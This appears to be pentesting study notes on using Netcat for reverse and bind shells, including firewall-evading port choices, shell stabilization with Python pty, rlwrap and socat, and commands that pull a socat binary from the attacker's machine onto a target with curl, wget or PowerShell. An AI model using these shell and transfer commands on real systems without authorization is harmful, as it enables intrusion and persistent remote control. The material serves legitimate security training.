# Netcat

Netcat is a fundamental tool in a pentester's toolkit for networking tasks. While it can perform a variety of functions, we'll focus on its use for shells.

#### Reverse Shells

* Reverse shells require shellcode and a listener.
*   To start a Netcat listener in Linux, use the following syntax:

    ```bash
    nc -lvnp <port-number>
    ```

    * **-l**: Tells Netcat to act as a listener.
    * **-v**: Requests verbose output.
    * **-n**: Instructs Netcat not to resolve host names or use DNS (details on this are beyond the scope of this room).
    * **-p**: Indicates that a port specification will follow.
* You can use any port number, but if you choose a port below 1024, you will need to use `sudo` to start your listener. It's often advisable to use well-known ports (like 80, 443, or 53) to increase the chances of bypassing outbound firewall rules on the target.
*   **Example**:

    ```bash
    sudo nc -lvnp 443
    ```
* After setting up the listener, you can connect back using various payloads, depending on the target environment.

#### Bind Shells

* For bind shells, we assume there is already a listener on a chosen port of the target. Our task is to connect to it.
*   The syntax for connecting to a bind shell is straightforward:

    ```bash
    nc <target-ip> <chosen-port>
    ```
* This command uses Netcat to make an outbound connection to the target on the specified port.

### Netcat Shell Stabilisation 

After connecting to a Netcat shell, the next step is to stabilize it, as these shells are very unstable by default. Here are some key points and techniques for stabilization:

#### Issues with Netcat Shells

* Netcat shells are non-interactive and can have formatting errors.
* Pressing Ctrl + C will terminate the shell.
* They are essentially processes running inside a terminal, not full-fledged terminals.

#### Technique 1: Python

* This technique is applicable only to Linux systems, which typically have Python installed by default. It involves three steps:
  1.  **Spawn a Better Shell**: Use the command:

      ```bash
      python -c 'import pty; pty.spawn("/bin/bash")'
      ```

      (If needed, specify the version of Python: `python2` or `python3`.)
  2.  **Set Terminal Type**: Run:

      ```bash
      export TERM=xterm
      ```

      This allows access to terminal commands like `clear`.
  3.  **Background the Shell**: Press Ctrl + Z, then in your terminal, run:

      ```bash
      stty raw -echo; fg
      ```

      This disables terminal echo, enabling tab autocompletes, arrow keys, and Ctrl + C functionality.
* **Note**: If the shell dies, input in your terminal won't be visible. To fix this, type `reset` and press enter.

#### Technique 2: rlwrap

* **rlwrap** provides access to history, tab autocompletion, and arrow keys immediately upon receiving a shell. However, some manual stabilization is still needed for Ctrl + C functionality.
*   Install rlwrap (not installed by default on Kali) with:

    ```bash
    sudo apt install rlwrap
    ```
*   Use rlwrap with a slightly different listener:

    ```bash
    rlwrap nc -lvnp <port>
    ```
*   This technique is particularly useful for stabilizing Windows shells. For Linux targets, you can further stabilize it by backgrounding the shell (Ctrl + Z) and using:

    ```bash
    stty raw -echo; fg
    ```

#### Technique 3: Socat

* Use an initial Netcat shell as a stepping stone to a more stable Socat shell. This method is limited to Linux targets.
*   Transfer a Socat static compiled binary to the target machine. A common method is to set up a web server on the attacking machine:

    ```bash
    sudo python3 -m http.server 80
    ```
*   On the target machine, use the Netcat shell to download the file:

    ```basic
    curl <LOCAL-IP>/socat -O /tmp/socat
    ```

    or

    ```bash
    wget <LOCAL-IP>/socat -O /tmp/socat
    ```
*   For Windows, use PowerShell to download the Socat binary:

    {% code overflow="wrap" %}
    ```bash
    Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows\temp\socat.exe
    ```
    {% endcode %}

#### Terminal Size Adjustment

* To use text editors that rely on accurate terminal size, you may need to manually adjust the terminal's tty size.
*   Open another terminal and run:

    ```bash
    stty -a
    ```

    Note the values for "rows" and "columns."
*   In your reverse/bind shell, type:

    ```bash
    stty rows <number>
    ```

    and

    ```bash
    stty cols <number>
    ```

    (Replace `<number>` with the values obtained from the previous command.)
